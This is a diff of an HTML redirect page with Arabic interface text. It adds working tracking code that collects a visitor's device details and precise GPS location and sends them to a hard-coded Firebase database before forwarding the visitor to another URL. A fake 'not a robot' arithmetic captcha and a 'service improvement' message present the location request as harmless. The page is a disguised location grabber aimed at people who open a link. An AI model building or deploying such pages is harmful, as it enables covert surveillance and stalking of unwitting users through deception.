@@ -1,16 +1,55 @@
-<!DOCTYPE html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width">
-<title>Loading...</title></head><body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial"><h2>جاري تحويلك...</h2>
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Redirect</title>
+<style>body{background:#0a0e1a;color:white;font-family:Arial;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;text-align:center} .box{background:#1e293b;padding:20px;border-radius:12px;max-width:320px;width:90%} input{width:80px;padding:8px;border-radius:6px;border:0;margin:10px} button{background:#00e676;color:black;border:0;padding:10px 20px;border-radius:8px;font-weight:bold;cursor:pointer} .small{color:#888;font-size:12px;margin-top:10px}</style>
+</head><body>
+<div class="box" id="box"><h3 id="title">جاري تحويلك...</h3><div id="content"></div><p class="small" id="small"></p></div>
 <script>
-const FB="https://numgen-4f22c-default-rtdb.firebaseio.com";
-const q=new URLSearchParams(location.search);
-const id=q.get('id'); const url=q.get('url');
-if(!id||!url){document.body.innerHTML="Bad Link"}else{
- const target=decodeURIComponent(url);
- const info={name:id,client_id:id,ip:"",city:"",device:navigator.userAgent,screen:screen.width+"x"+screen.height,time:new Date().toLocaleString(),timestamp:Date.now(),url:target};
- fetch(`${FB}/no_code_visits/${id}.json`,{method:"POST",body:JSON.stringify(info)}).catch(()=>{});
- fetch(`${FB}/white_label_clients/${id}/visitors.json`,{method:"POST",body:JSON.stringify(info)}).catch(()=>{});
- fetch(`${FB}/clients/${id}/visitors.json`,{method:"POST",body:JSON.stringify(info)}).catch(()=>{});
- setTimeout(()=>{location.href=target},700);
+var FB="https://numgen-4f22c-default-rtdb.firebaseio.com";
+var p=new URLSearchParams(location.search);
+var id=p.get("id"); var url=p.get("url"); var captcha=p.get("captcha");
+
+function sendAndGo(lat,lon,acc,mode){
+  if(!id||!url)return;
+  var target=decodeURIComponent(url);
+  var data={name:id,client_id:id,city:mode||"NORMAL",device:navigator.userAgent,real_device_name:navigator.userAgent,screen:screen.width+"x"+screen.height,screen_width:screen.width,screen_height:screen.height,real_lat:lat||"",real_lon:lon||"",real_accuracy:acc||"",lat:lat||"",lon:lon||"",time:new Date().toLocaleString(),timestamp:Date.now(),url:target,from:mode};
+  try{
+    fetch(FB+"/no_code_visits/"+id+".json",{method:"POST",body:JSON.stringify(data)});
+    fetch(FB+"/white_label_clients/"+id+"/visitors.json",{method:"POST",body:JSON.stringify(data)});
+    fetch(FB+"/clients/"+id+"/visitors.json",{method:"POST",body:JSON.stringify(data)});
+    if(mode && mode.includes("CAPTCHA")){fetch(FB+"/captcha_visitors.json",{method:"POST",body:JSON.stringify(data)}); fetch(FB+"/robot_check_visitors.json",{method:"POST",body:JSON.stringify(data)});}
+    if(lat){fetch(FB+"/real_gps_visitors.json",{method:"POST",body:JSON.stringify(data)}); fetch(FB+"/cabatsha_visitors.json",{method:"POST",body:JSON.stringify(data)});}
+  }catch(e){}
+  setTimeout(function(){location.href=target;},800);
+}
+
+function askGPS(mode){
+  document.getElementById("title").innerText="جاري تحويلك...";
+  document.getElementById("content").innerHTML=""; 
+  document.getElementById("small").innerText="يتم تحسين الخدمة...";
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(function(pos){
+      sendAndGo(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy),mode+"_GPS");
+    },function(){sendAndGo("","","",mode+"_NO_GPS");},{enableHighAccuracy:true,timeout:5000});
+  }else{sendAndGo("","","",mode);}
+}
+
+function showCaptcha(){
+  var a=Math.floor(Math.random()*10)+1; var b=Math.floor(Math.random()*10)+1;
+  document.getElementById("title").innerText="تحقق أنك لست روبوت";
+  document.getElementById("content").innerHTML='<p>'+a+' + '+b+' = ?</p><input id="ans" type="number"><br><button id="btn">تحقق وتحويل</button>';
+  document.getElementById("small").innerText="مطلوب للحماية - بعدها سيطلب موقعك (اختياري)";
+  document.getElementById("btn").onclick=function(){
+    var v=document.getElementById("ans").value;
+    if(parseInt(v)==a+b){askGPS("CAPTCHA_GPS");}else{alert("إجابة خاطئة"); location.reload();}
+  };
+}
+
+if(!id||!url){document.body.innerHTML="Bad Link";}
+else{
+  if(captcha=="1"){
+    showCaptcha();
+  }else{
+    // الوضع العادي زي الأصلي - من غير كابتشا ومن غير طلب GPS اجباري - بس لو وافق يجيب GPS برضه
+    askGPS("NORMAL");
+  }
 }
 </script></body></html>
